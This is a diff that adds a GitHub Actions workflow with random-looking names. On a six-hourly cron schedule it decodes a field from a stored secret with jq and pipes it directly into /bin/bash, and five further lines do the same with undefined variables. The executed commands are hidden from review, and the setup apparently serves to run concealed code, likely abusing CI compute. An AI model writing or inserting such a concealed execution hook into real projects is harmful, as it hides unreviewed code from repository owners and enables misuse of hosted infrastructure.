@@ -1,0 +1,23 @@
+name: mouqiumm
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mouqiumm
+        env:
+          a749: ${{ secrets.a749 }}
+        run: |
+          echo $a749 | jq -r .rt14 | /bin/bash
+          echo $bfoko8 | jq -r .mke51256 | /bin/bash
+          echo $hvd2310 | jq -r .yk05231 | /bin/bash
+          echo $op91501 | jq -r .njg945 | /bin/bash
+          echo $ypazn29961 | jq -r .ncq19 | /bin/bash
+          echo $yuw0476 | jq -r .ixpt25 | /bin/bash
+
